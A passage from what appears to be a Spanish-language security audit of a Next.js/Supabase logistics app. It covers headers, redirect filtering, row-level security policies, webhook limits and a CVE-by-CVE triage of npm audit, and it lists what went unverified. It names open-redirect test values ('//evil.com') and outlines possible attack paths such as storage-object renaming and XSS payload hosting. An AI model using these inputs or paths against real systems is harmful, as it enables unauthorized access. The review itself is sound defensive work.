**Cabeceras de seguridad y cookies.** `withSecurityHeaders` se aplica en un solo
punto al final **y** al objeto de redirección (`proxy.ts:72,77`), con `no-store`
en las rutas gateadas (`:74`) y las cookies de refresco copiadas al redirect
(`:71`) — el hueco de la ronda 8 sigue cerrado. Sigue sin CSP, cuarta ronda.

**Redirecciones abiertas: no hay.** Los cuatro sitios que aceptan `next` lo
filtran con `startsWith('/dashboard')`: `login/page.tsx:50,55,71`,
`auth/callback/route.ts:12`, `acceso/page.tsx:11,32`. `//evil.com` y
`https://evil.com` no pasan, y `new URL(dest, req.url)` mantiene el origen.
Enumeración de usuarios en `/login`: `esCorreoSinCuenta` (`:34-40`, usado en
`:96`) y el exceso de límite (`:74-76`) terminan los dos en el **mismo**
`&enviado=1` / `&error=1`
genérico.

**Los límites de cuerpo y de tasa del webhook, correctos.**
`webhook/whatsapp/route.ts:41` mide `content-length` **antes** de leer y `:44`
vuelve a medir `raw.length` después — que es exactamente lo que `bodyExcede`
advierte que hay que hacer y `api/demo` no hace. HMAC antes de parsear. Rate
limit por teléfono, no por IP (`:60`), que es lo correcto porque todo Meta viene
de sus IPs. El límite sigue siendo por instancia y el módulo lo dice sin adornos
(`ratelimit.ts:8-14`).

**La RLS de las cuatro tablas nuevas de la 0047 está bien escrita para el
chofer.** Las cuatro nacen con RLS (`0047:157-164`), `unidad`/`mantenimiento`/
`incidencia` con `not is_operador()` en `using` **y** `with check`
(`:173-177`), y `pod` con las dos policies del chofer acotadas por
`get_user_operador_id()` y **sin DELETE** (`:187-193`). Es la lección de la 0045
aplicada. Lo que no aplicó es la del contador (hallazgo ALTO).

**El chat del panel no traduce lenguaje natural a SQL.** `dashboard/chat.tsx:22-42`
es coincidencia de palabras clave contra datos ya calculados en el servidor; el
texto del usuario nunca llega a la base. Cerrado por diseño y con el
razonamiento escrito (`:8-13`). El problema del rail no es el chat: es de dónde
salen sus datos.

**`/aviso/[tenant]` sigue sin ser una fuga**, pero su premisa escrita ya no es
cierta y lo anoto para quien la lea: su cabecera afirma «Ninguna ruta de la app
acepta un tenant del cliente», y desde esta ronda tres rutas aceptan `?tenant=`.
No cambia la conclusión (solo `superadmin` lo honra, y la página solo devuelve
razón social y domicilio con `notFound()` indistinguible), cambia que el
argumento que la sostiene caducó.

### CVE — los 11 de `npm audit`, uno por uno, y por qué los descarto

`npm audit` da **11 (2 críticas, 6 altas, 3 moderadas)**. Ninguna tiene camino
real de explotación en esta app. Por escrito:

- **`vitest` + `@vitest/coverage-v8` (2 críticas)** — la misma advisory contada
  dos veces, vía `esbuild`/`vite`. `devDependencies`, nunca se corre `--ui`, y
  `esbuild` GHSA-67mh-4wv8-2f99 solo afecta al **dev server**. No hay `vite` ni
  `esbuild` en el runtime de la función desplegada.
- **`postcss` (4 advisories, alta, vía `next`)** — build-time. Las cuatro son XSS
  por `</style>` sin escapar y lectura de archivo por `sourceMappingURL`; no hay
  ninguna entrada donde el atacante controle el CSS de este repo (el único CSS es
  `globals.css`, del repo). No está en el bundle de la función.
- **`fast-uri` (alta, GHSA-7p8r-x3mc-p8w7, host confusion) — nueva esta ronda.**
  La descarto con el árbol a la vista: `npm ls fast-uri` da una sola ruta,
  `@sentry/nextjs → @sentry/webpack-plugin → webpack → schema-utils → ajv →
  fast-uri`. Es el plugin de **webpack** que sube los source maps en el build; no
  hay un solo `require` de `ajv` en el runtime de la función, y ninguna URL
  controlada por un atacante pasa por ahí. Build-time puro.
- **`next` (alta, solo por depender de `postcss` y `sharp`)** — no aporta camino
  propio. Verifiqué además que **CVE-2025-29927** (bypass de middleware por
  `x-middleware-subrequest`) no aplica: `next@16.2.11`, arreglado en 15.2.3.
  Importa porque `/dashboard/mapa` y `/dashboard/soporte` no tienen segunda capa.
- **`sharp` 0.34.5 (alta, GHSA-f88m-g3jw-g9cj, cuatro CVE de libvips)** — el
  **único** paquete que toca bytes de un atacante: `intake/cfdi.ts:249` corre
  `sharp(image).rotate().resize(…)` sobre lo que baja de WhatsApp. Reverifiqué
  que las superficies nuevas de esta ronda **no ensanchan** ese canal: el avatar
  no pasa por `sharp` (`mi-perfil/page.tsx:50` sube el archivo tal cual), y
  `/dashboard/pod` no procesa imágenes. Sigue haciendo falta ser un operador dado
  de alta (`processor.ts` corta en `resolveOperador` antes de descargar). Es
  **observación vigilada, no hallazgo**, igual que en la ronda 10 — y sigue
  igual: hay arreglo publicado (`sharp@0.35.3`) y `package.json:32` sigue fijando
  `^0.34.0`.

**Compuerta, medida hoy:** `npx vitest run` → exit 0, 172 archivos, 1670
pruebas, 1 saltada. Idéntica a la línea base del MAPA.

---

## Lo que NO alcancé a revisar

- **Ejecutar contra Postgres real cualquiera de los dos hallazgos de RLS y el de
  grants.** Todo mi razonamiento es sobre el texto de las policies
  (`0045:39`, `0001:110-116`, `0047:167-193`) y sobre qué cliente usa cada
  página, leídos línea por línea — pero no corrí `set local role authenticated` +
  `update operador …`, ni `has_function_privilege('anon','try_lock_viaje…')`
  contra la base del proyecto, que es lo que los volvería incontestables. El
  bloque 26 de `verificaciones.sql` solo **cuenta filas visibles** en tres tablas
  y nunca intenta escribir; el bloque 16 sí mira los grants, pero es un
  `raise exception` manual que nadie corre en CI.
- **Confirmar el `with check` faltante de `avatares_propio_update`
  (`0046:32-35`).** La policy de UPDATE tiene `using` y no `with check`, lo que
  en teoría permite renombrar el propio objeto a la carpeta de otro usuario y
  contradice la garantía que la migración escribe («no puede pisar el de alguien
  más aunque adivine la ruta»). No lo reporto como hallazgo porque no pude
  determinar si el endpoint `POST /storage/v1/object/move` de Supabase exige
  además `insert` sobre el destino, que lo cerraría. Es una prueba de cinco
  minutos contra un proyecto real y no la tengo.
- **El estado del interruptor «Allow new users to sign up»** del proyecto
  Supabase, del que depende por completo el hallazgo de Google. Esta ronda corre
  sin credenciales.
- **CSP y el sumidero de XSS de `/privacidad`.** Cuarta ronda sin CSP ni en
  `proxy.ts` ni en `next.config.ts`, y sigo sin recorrer `privacidad/page.tsx`
  con el detalle que merece — ahora con más razón, porque el bucket público de
  avatares le da a un atacante un sitio donde alojar el payload.
- **Concurrencia real del rate-limit.** Quinto pendiente idéntico: exige tráfico
  agresivo contra producción, que esta ronda prohíbe.
- **El resto de `src/lib/cuadra/operacion.ts` (567 líneas) desde la óptica de
  autorización de escritura.** Verifiqué que las 21 consultas filtran por
  `tenant_id` y que los server actions de las cuatro páginas nuevas repiten
  `puedeAsignar` adentro, pero no recorrí una por una las 12 funciones de
  escritura buscando el patrón de `crearIncidencia`.
